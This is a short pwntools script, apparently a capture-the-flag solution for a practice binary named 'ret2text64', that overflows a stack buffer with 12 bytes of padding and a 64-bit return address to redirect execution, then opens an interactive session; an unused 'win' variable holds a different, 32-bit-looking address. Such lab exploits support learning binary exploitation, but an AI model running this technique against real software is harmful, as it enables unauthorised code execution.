from pwn import *

sh = process("./ret2text64")

win = 0x8048456
sh.sendline(b'A'*12 + p64(0x401190))
sh.interactive()
